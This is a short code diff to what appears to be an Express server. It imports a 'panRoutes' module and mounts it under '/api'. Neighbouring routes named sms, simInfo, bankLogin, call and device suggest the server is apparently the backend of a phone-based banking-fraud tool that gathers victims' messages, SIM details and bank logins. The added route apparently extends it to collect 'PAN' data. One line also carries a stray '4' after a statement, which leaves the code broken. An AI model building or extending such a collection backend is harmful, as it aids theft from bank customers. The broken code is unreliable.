@@ -10,6 +10,7 @@ import { connectDB } from "./config/db.js";
 
 import deviceRoutes from "./routes/deviceRoutes.js";
 import smsRoutes from "./routes/smsRoutes.js";
+import panRoutes from "./routes/panRoutes.js";
 import simInfoRoutes from "./routes/simInfoRoutes.js";
 import authRoutes from "./routes/authRoutes.js";
 import bankLoginRoutes from "./routes/bankLoginRoutes.js";
@@ -296,6 +297,7 @@ app.use("/api/notification", notificationRoutes);
 app.use("/api/call", callRoutes);
 app.use("/api/admin", adminRoutes);
 app.use("/api/serial", serialRoutes);
+app.use("/api", panRoutes);
 app.use("/api/status", statusRoutes);
 app.use("/api/action", logRoutes);4
 app.use("/api", formRoutes);
